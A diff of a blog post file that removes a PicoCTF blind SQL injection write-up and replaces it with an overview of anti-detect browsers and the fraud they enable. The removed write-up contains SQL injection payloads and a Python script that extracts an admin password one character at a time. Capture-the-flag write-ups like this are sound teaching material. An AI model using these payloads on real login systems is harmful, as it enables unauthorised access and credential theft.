@@ -1,83 +1,52 @@
 ---
 layout: post
-title: "PicoCTF - Web Gauntlet: Blind SQLi Writeup"
-date: 2025-04-12
-last_modified_at: 2025-04-15
-tags: [web, sqli]
-description: "Walkthrough of a blind SQL injection challenge in PicoCTF's Web Gauntlet — enumeration, filter bypass, and full credential exfiltration with sqlmap-free payloads."
-image: /assets/images/example-cover.svg
+title: "The Hidden World of Anti-Detect Browsers"
+date: 2026-06-15
+last_modified_at: 2026-06-15
+tags: [cybersecurity, anonymity, fraud]
+description: "How anti-detect browsers hide digital fingerprints, the tools hackers use, and the illicit activities they enable—from credential stuffing to botting."
 ---
 
-A classic login-bypass turned blind-SQLi extraction. The server filters obvious keywords but leaves enough room for a boolean-based oracle. Below is the full path from recon to flag.
+Anti-detect browsers let users erase their digital fingerprint and pretend to be someone else online. They're built on Chrome and Firefox code but twist every detectable detail—user agent, OS, screen resolution, even installed fonts—to mask who you really are.
 
-![Terminal output of the exploit running against the target login page](/assets/images/example-cover.svg)
+## What They Actually Do
 
-## Enumeration
+These tools don't just hide your IP. They let you spoof metadata down to the font list on your device. Think of it like walking into a crowded market wearing a mask—and a fake name tag, a fake outfit, and a fake voice.
 
-The target exposes a single login form at `/`. The source returns no useful comments, but the response time and error wording differ between a valid username and an invalid one — a classic boolean side-channel.
+You can configure what the outside world sees:
+- User agent string  
+- Operating system  
+- Screen resolution  
+- Installed fonts  
+- IP address (when paired with a proxy)
 
-```bash
-curl -s -X POST https://target.example/login \
-  -d "user=admin&pass=test" -o - | grep -i "invalid"
-```
+## Notorious Tools in the Scene
 
-Trying a few standard payloads, most are blocked by a regex filter rejecting `OR`, `--`, and `#`.
+| Browser         | Origin / Reputation                              |
+|-----------------|--------------------------------------------------|
+| Genesium        | Spawned from Genesis Market; strong anonymity    |
+| Linken Sphere   | Hacker favorite; deep fingerprint customization  |
+| Fraud Fox       | Older but still used; simple interface           |
 
-### Filter probing
+**Others worth noting:** Nstbrowser, MoreLogin, Multilogin, GeeLark
 
-```python
-import requests
+##How Hackers Use Them
 
-PAYLOADS = ["'", '"', "' OR 1=1--", "admin'/*", "admin' || '1"]
-for p in PAYLOADS:
-    r = requests.post("https://target.example/login",
-                      data={"user": p, "pass": "x"})
-    print(p, "→", "OK" if "invalid" not in r.text.lower() else "BLOCKED")
-```
+### Credential Stuffing
+Attackers feed stolen username/password pairs into accounts while shifting fingerprints to avoid security flags. One batch of credentials can hit thousands of accounts without tripping detection.
 
-The `||` operator slips through. That's our wedge.
+### Fraudulent Transactions
+Stolen credit cards, identity theft, and fake purchases all happen behind a changed digital mask. The real identity stays hidden while the transaction goes through.
 
-## Exploitation
+### Scamming and Phishing
+Fake websites imitate legitimate ones—bank portals, login pages, payment gateways. Anti-detect browsers let attackers host these sites and dodge law enforcement tracking.
 
-With `||` available we can build a boolean oracle. The pattern below leaks the admin password one character at a time using `SUBSTR` and `ASCII`.
+### Botting and Mass Account Creation
+Social media, e-commerce, and gaming platforms get flooded with fake accounts. Reviews are manipulated, spam explodes, and markets get disrupted.
 
-```python
-import requests, string
+### Data Harvesting
+Websites get scraped for client lists, prices, emails, or private data without triggering anti-bot systems. The scraped data often ends up on the dark web or fuels targeted attacks.
 
-URL = "https://target.example/login"
-CHARS = string.ascii_letters + string.digits + "_-{}!"
-leaked = ""
+## The Bottom Line
 
-while True:
-    for c in CHARS:
-        payload = f"admin' || SUBSTR(password,{len(leaked)+1},1)='{c}' || '"
-        r = requests.post(URL, data={"user": payload, "pass": "x"})
-        if "welcome" in r.text.lower():
-            leaked += c
-            print("[+]", leaked)
-            break
-    else:
-        break
-
-print("password =", leaked)
-```
-
-After ~40 requests the full credential drops:
-
-```text
-password = picoCTF{bl1nd_but_n0t_d34f_9a2f}
-```
-
-## Privilege Escalation
-
-Logging in as `admin` exposes an internal endpoint, `/admin/flag`, which simply prints the flag — there is no further escalation needed once the credential is recovered.
-
-```text
-flag: picoCTF{bl1nd_but_n0t_d34f_9a2f}
-```
-
-## Takeaways
-
-- Blacklists fail open. `||` is the same as `OR` in most engines.
-- Response-body or timing differences are enough to turn any auth check into a boolean oracle.
-- Always normalize *and* parameterize on the server side.
+Anti-detect browsers aren't just privacy tools—they're deception engines. They enable anonymity, but they also power fraud, phishing, botnets, and large-scale account abuse. As security systems tighten, these browsers evolve too, keeping the fight between protection and exploitation locked in a constant cycle.
